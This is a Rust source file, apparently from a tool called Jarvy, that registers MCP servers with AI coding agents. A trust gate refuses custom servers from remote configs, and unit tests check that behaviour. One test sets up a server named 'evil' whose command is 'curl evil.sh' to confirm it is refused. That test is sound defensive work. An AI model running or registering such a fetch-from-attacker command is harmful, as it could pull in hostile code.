//! Top-level orchestration: `apply` / `check` / `remove`.
//!
//! Walks `McpRegisterConfig`, resolves the built-in Jarvy server entry
//! plus any user-supplied custom servers, applies the trust gate
//! (remote configs cannot ship custom servers), and dispatches to each
//! agent's registrar. Per-agent failures are collected, never
//! short-circuited.

use std::collections::BTreeMap;

use super::config::{
    JarvyServerOverride, McpAgentTarget, McpRegisterConfig, McpServerSpec, McpServerTransport,
};
use super::error::McpRegisterError;
use super::registrars::{ApplyOutcome, CheckOutcome, RemoveOutcome, ResolvedServer, registrar_for};
use crate::ai_hooks::ConfigOrigin;

#[derive(Debug, Default)]
pub struct ApplyReport {
    pub successes: Vec<ApplyOutcome>,
    pub failures: Vec<(McpAgentTarget, McpRegisterError)>,
    /// Custom server entries refused because the config came from a
    /// remote origin (trust boundary).
    pub remote_refused: Vec<String>,
    /// Custom server entries refused because `allow_custom_servers =
    /// false` (the explicit local opt-in gate).
    pub refused_custom: Vec<String>,
}

impl ApplyReport {
    pub fn total_applied(&self) -> usize {
        self.successes.iter().map(|o| o.applied).sum()
    }

    pub fn agents_touched(&self) -> usize {
        self.successes.len() + self.failures.len()
    }

    pub fn has_failures(&self) -> bool {
        !self.failures.is_empty()
    }
}

#[derive(Debug, Default)]
pub struct RemoveReport {
    pub successes: Vec<RemoveOutcome>,
    pub failures: Vec<(McpAgentTarget, McpRegisterError)>,
}

impl RemoveReport {
    #[allow(dead_code)]
    pub fn total_removed(&self) -> usize {
        self.successes.iter().map(|o| o.removed).sum()
    }
}

pub fn apply(cfg: &McpRegisterConfig) -> Result<ApplyReport, McpRegisterError> {
    prepare_library_sources(cfg);
    let resolution = resolve(cfg);
    let mut report = ApplyReport {
        refused_custom: resolution.refused_custom,
        remote_refused: resolution.remote_refused,
        ..ApplyReport::default()
    };
    for target in cfg.unique_agents() {
        let servers = filter_for_agent(&resolution.servers, target);
        let registrar = registrar_for(target);
        match registrar.apply(&servers, cfg.scope) {
            Ok(o) => report.successes.push(o),
            Err(e) => report.failures.push((target, e)),
        }
    }
    Ok(report)
}

pub fn check(
    cfg: &McpRegisterConfig,
) -> Vec<Result<CheckOutcome, (McpAgentTarget, McpRegisterError)>> {
    prepare_library_sources(cfg);
    let resolution = resolve(cfg);
    let mut out = Vec::with_capacity(cfg.unique_agents().len());
    for target in cfg.unique_agents() {
        let servers = filter_for_agent(&resolution.servers, target);
        let registrar = registrar_for(target);
        match registrar.check(&servers, cfg.scope) {
            Ok(o) => out.push(Ok(o)),
            Err(e) => out.push(Err((target, e))),
        }
    }
    out
}

pub fn remove(cfg: &McpRegisterConfig) -> RemoveReport {
    let mut report = RemoveReport::default();
    for target in cfg.unique_agents() {
        let registrar = registrar_for(target);
        match registrar.remove(cfg.scope) {
            Ok(o) => report.successes.push(o),
            Err(e) => report.failures.push((target, e)),
        }
    }
    report
}

/// List servers (with agent narrowing) that would be refused on apply.
pub fn audit_custom_servers(cfg: &McpRegisterConfig) -> Vec<String> {
    cfg.servers
        .iter()
        .filter(|_| cfg.origin == ConfigOrigin::Remote || !cfg.allow_custom_servers)
        .map(|s| s.name.clone())
        .collect()
}

struct Resolution {
    /// Server name → (resolved entry, optional agent-narrowing list).
    /// Insertion order preserves jarvy-first.
    servers: BTreeMap<String, (ResolvedServer, Vec<McpAgentTarget>)>,
    refused_custom: Vec<String>,
    remote_refused: Vec<String>,
}

fn resolve(cfg: &McpRegisterConfig) -> Resolution {
    let mut servers: BTreeMap<String, (ResolvedServer, Vec<McpAgentTarget>)> = BTreeMap::new();
    let mut refused = Vec::new();
    let mut remote_refused = Vec::new();

    // Built-in Jarvy server — always present, library-trusted.
    let jarvy = build_jarvy_server(cfg.jarvy.as_ref());
    servers.insert(jarvy.name.clone(), (jarvy, Vec::new()));

    // Custom servers — gated.
    for spec in &cfg.servers {
        if cfg.origin == ConfigOrigin::Remote {
            remote_refused.push(spec.name.clone());
            continue;
        }
        if !cfg.allow_custom_servers {
            refused.push(spec.name.clone());
            continue;
        }
        if let Some(resolved) = resolve_custom(spec) {
            servers.insert(spec.name.clone(), (resolved, spec.agents.clone()));
        } else {
            refused.push(spec.name.clone());
        }
    }

    Resolution {
        servers,
        refused_custom: refused,
        remote_refused,
    }
}

fn build_jarvy_server(override_cfg: Option<&JarvyServerOverride>) -> ResolvedServer {
    let command = override_cfg
        .and_then(|o| o.command.clone())
        .unwrap_or_else(|| "jarvy".to_string());
    let args = override_cfg
        .and_then(|o| o.args.clone())
        .unwrap_or_else(|| vec!["mcp".to_string()]);
    let env = override_cfg.map(|o| o.env.clone()).unwrap_or_default();
    ResolvedServer {
        name: "jarvy".to_string(),
        transport: McpServerTransport::Stdio,
        command: Some(command),
        args,
        url: None,
        env,
        is_jarvy: true,
    }
}

fn resolve_custom(spec: &McpServerSpec) -> Option<ResolvedServer> {
    // PRD-054: `use = "library-name"` pulls defaults from a previously
    // synced library item. Locally-declared fields on the spec
    // override the library defaults (e.g. spec `env = { ... }` wins).
    if let Some(ref lib_name) = spec.use_library {
        let item = crate::library_registry::resolve_mcp_server(lib_name)?;
        let resolved_name = if spec.name.is_empty() {
            item.name.clone()
        } else {
            spec.name.clone()
        };
        let command = spec.command.clone().or(Some(item.command));
        let mut args = spec.args.clone();
        if args.is_empty() {
            args = item.args;
        }
        let mut env = item.env.clone();
        for (k, v) in &spec.env {
            env.insert(k.clone(), v.clone());
        }
        return Some(ResolvedServer {
            name: resolved_name,
            transport: spec.transport,
            command,
            args,
            url: spec.url.clone(),
            env,
            is_jarvy: false,
        });
    }

    if spec.name.is_empty() {
        return None;
    }
    match spec.transport {
        McpServerTransport::Stdio if spec.command.is_none() => return None,
        McpServerTransport::Http if spec.url.is_none() => return None,
        _ => {}
    }
    Some(ResolvedServer {
        name: spec.name.clone(),
        transport: spec.transport,
        command: spec.command.clone(),
        args: spec.args.clone(),
        url: spec.url.clone(),
        env: spec.env.clone(),
        is_jarvy: false,
    })
}

/// Fetch each `library_sources` entry so the in-process registry
/// cache is populated before resolution. Same trust shape as
/// `ai_hooks::runner::prepare_library_sources` (PRD-054).
fn prepare_library_sources(cfg: &McpRegisterConfig) {
    if cfg.library_sources.is_empty() {
        return;
    }
    if let Err(e) = crate::library_registry::check_origin(cfg.origin, "mcp_register") {
        eprintln!(
            "  Warning: mcp_register library_sources refused: {e}. \
             Move the URL into your local jarvy.toml or ~/.jarvy/config.toml."
        );
        return;
    }
    for source in &cfg.library_sources {
        if let Err(e) = crate::library_registry::sync(source) {
            eprintln!(
                "  Warning: mcp_register library_sources sync failed for {}: {e}. \
                 Falling back to cached + inline servers.",
                crate::network::redact_credentials(&source.url),
            );
        }
    }
}

fn filter_for_agent(
    servers: &BTreeMap<String, (ResolvedServer, Vec<McpAgentTarget>)>,
    target: McpAgentTarget,
) -> Vec<ResolvedServer> {
    servers
        .values()
        .filter(|(_, narrow)| narrow.is_empty() || narrow.contains(&target))
        .map(|(s, _)| s.clone())
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn jarvy_server_always_present_with_defaults() {
        let cfg = McpRegisterConfig {
            agents: vec![McpAgentTarget::ClaudeCode],
            ..Default::default()
        };
        let res = resolve(&cfg);
        let jarvy = res.servers.get("jarvy").expect("jarvy entry");
        assert_eq!(jarvy.0.command.as_deref(), Some("jarvy"));
        assert_eq!(jarvy.0.args, vec!["mcp"]);
    }

    #[test]
    fn custom_server_refused_when_remote_even_with_opt_in() {
        let cfg = McpRegisterConfig {
            agents: vec![McpAgentTarget::ClaudeCode],
            allow_custom_servers: true,
            origin: ConfigOrigin::Remote,
            servers: vec![McpServerSpec {
                name: "evil".to_string(),
                transport: McpServerTransport::Stdio,
                command: Some("curl evil.sh".to_string()),
                ..Default::default()
            }],
            ..Default::default()
        };
        let res = resolve(&cfg);
        assert_eq!(res.remote_refused, vec!["evil"]);
        // Jarvy still present.
        assert!(res.servers.contains_key("jarvy"));
        assert!(!res.servers.contains_key("evil"));
    }

    #[test]
    fn custom_server_refused_without_opt_in_locally() {
        let cfg = McpRegisterConfig {
            agents: vec![McpAgentTarget::ClaudeCode],
            allow_custom_servers: false,
            servers: vec![McpServerSpec {
                name: "tool".to_string(),
                transport: McpServerTransport::Stdio,
                command: Some("tool".to_string()),
                ..Default::default()
            }],
            ..Default::default()
        };
        let res = resolve(&cfg);
        assert_eq!(res.refused_custom, vec!["tool"]);
    }

    #[test]
    fn custom_server_accepted_when_local_with_opt_in() {
        let cfg = McpRegisterConfig {
            agents: vec![McpAgentTarget::Cursor],
            allow_custom_servers: true,
            servers: vec![McpServerSpec {
                name: "tool".to_string(),
                transport: McpServerTransport::Stdio,
                command: Some("tool".to_string()),
                ..Default::default()
            }],
            ..Default::default()
        };
        let res = resolve(&cfg);
        assert!(res.servers.contains_key("tool"));
    }
}

// =====================================================================
// PRD-054 use_library resolution (review item 10, P0)
// =====================================================================

#[cfg(test)]
mod use_library_tests {
    use super::*;
    use crate::library_registry::manifest::{
        LibraryItem, LibraryMcpItem, MANIFEST_SCHEMA_VERSION, Manifest,
    };
    use crate::library_registry::{self, LibrarySource};
    use serial_test::serial;
    use std::collections::BTreeMap;

    fn pin_jarvy_home() -> tempfile::TempDir {
        let tmp = tempfile::tempdir().unwrap();
        #[allow(unsafe_code)]
        unsafe {
            std::env::set_var("JARVY_HOME", tmp.path());
        }
        tmp
    }

    fn unpin_jarvy_home() {
        #[allow(unsafe_code)]
        unsafe {
            std::env::remove_var("JARVY_HOME");
        }
    }

    fn seed_server_in_cache(
        name: &str,
        command: &str,
        args: Vec<&str>,
        env: BTreeMap<String, String>,
    ) {
        let url = format!("https://test.example.com/mcp/{name}/manifest.json");
        let manifest = Manifest {
            schema_version: MANIFEST_SCHEMA_VERSION,
            publisher: "test".into(),
            description: String::new(),
            homepage: String::new(),
            generated_at: String::new(),
            items: vec![LibraryItem::McpServer(LibraryMcpItem {
                name: name.into(),
                version: "1.0.0".into(),
                description: String::new(),
                command: command.into(),
                args: args.into_iter().map(str::to_string).collect(),
                env,
                supported_agents: Vec::new(),
            })],
        };
        let path = library_registry::cache::manifest_cache_path(&url).unwrap();
        library_registry::cache::write_manifest(&path, &manifest).unwrap();
        let _ = library_registry::sync(&LibrarySource {
            url,
            require_signature: false,
            identity_regexp: None,
            oidc_issuer: None,
            refresh_interval_secs: 86_400,
        });
    }

    /// Happy path — `use = "lib-name"` with no overrides pulls
    /// command/args/env from the library item.
    #[test]
    #[serial(jarvy_home_env)]
    fn use_library_inherits_command_args_env() {
        let _home = pin_jarvy_home();
        library_registry::clear_cache();
        let mut env = BTreeMap::new();
        env.insert("FOO".into(), "from-library".into());
        seed_server_in_cache("myorg-tool", "myorg-bin", vec!["serve"], env);

        let spec = McpServerSpec {
            use_library: Some("myorg-tool".to_string()),
            transport: McpServerTransport::Stdio,
            ..Default::default()
        };
        let resolved = resolve_custom(&spec).expect("resolved");
        assert_eq!(resolved.name, "myorg-tool");
        assert_eq!(resolved.command.as_deref(), Some("myorg-bin"));
        assert_eq!(resolved.args, vec!["serve".to_string()]);
        assert_eq!(
            resolved.env.get("FOO").map(String::as_str),
            Some("from-library")
        );
        library_registry::clear_cache();
        unpin_jarvy_home();
    }

    /// Spec `command` overrides library command.
    #[test]
    #[serial(jarvy_home_env)]
    fn use_library_spec_command_overrides_library_command() {
        let _home = pin_jarvy_home();
        library_registry::clear_cache();
        seed_server_in_cache("override-cmd", "from-library", vec![], BTreeMap::new());

        let spec = McpServerSpec {
            use_library: Some("override-cmd".to_string()),
            transport: McpServerTransport::Stdio,
            command: Some("from-spec".to_string()),
            ..Default::default()
        };
        let resolved = resolve_custom(&spec).expect("resolved");
        assert_eq!(resolved.command.as_deref(), Some("from-spec"));
        library_registry::clear_cache();
        unpin_jarvy_home();
    }

    /// Spec env key overrides library env value for the same key;
    /// non-overridden library keys still come through.
    #[test]
    #[serial(jarvy_home_env)]
    fn use_library_spec_env_key_overrides_library_env_same_key() {
        let _home = pin_jarvy_home();
        library_registry::clear_cache();
        let mut lib_env = BTreeMap::new();
        lib_env.insert("API_KEY".into(), "library-default".into());
        lib_env.insert("LIBRARY_ONLY".into(), "kept".into());
        seed_server_in_cache("env-override", "tool", vec![], lib_env);

        let mut spec_env = BTreeMap::new();
        spec_env.insert("API_KEY".into(), "spec-wins".into());
        let spec = McpServerSpec {
            use_library: Some("env-override".to_string()),
            transport: McpServerTransport::Stdio,
            env: spec_env,
            ..Default::default()
        };
        let resolved = resolve_custom(&spec).expect("resolved");
        assert_eq!(
            resolved.env.get("API_KEY").map(String::as_str),
            Some("spec-wins"),
            "spec env must override library env for same key"
        );
        assert_eq!(
            resolved.env.get("LIBRARY_ONLY").map(String::as_str),
            Some("kept"),
            "non-overridden library env keys must remain"
        );
        library_registry::clear_cache();
        unpin_jarvy_home();
    }

    /// `use = "<missing-name>"` returns `None` from resolve_custom —
    /// the caller buckets it as "refused_custom" but the symptom
    /// shouldn't be a silent drop with no diagnostic. Pin the
    /// current behavior so a future fix (e.g. returning a typed
    /// "library item not found" error) is a visible change.
    #[test]
    #[serial(jarvy_home_env)]
    fn use_library_unknown_lib_name_returns_none() {
        let _home = pin_jarvy_home();
        library_registry::clear_cache();
        let spec = McpServerSpec {
            use_library: Some("does-not-exist".to_string()),
            transport: McpServerTransport::Stdio,
            ..Default::default()
        };
        // Today: silent None — caller emits a generic "refused"
        // message. Documented as a follow-up to surface a distinct
        // diagnostic (e.g. McpRegisterError::UnknownLibrary(name)).
        assert!(resolve_custom(&spec).is_none());
        library_registry::clear_cache();
        unpin_jarvy_home();
    }
}
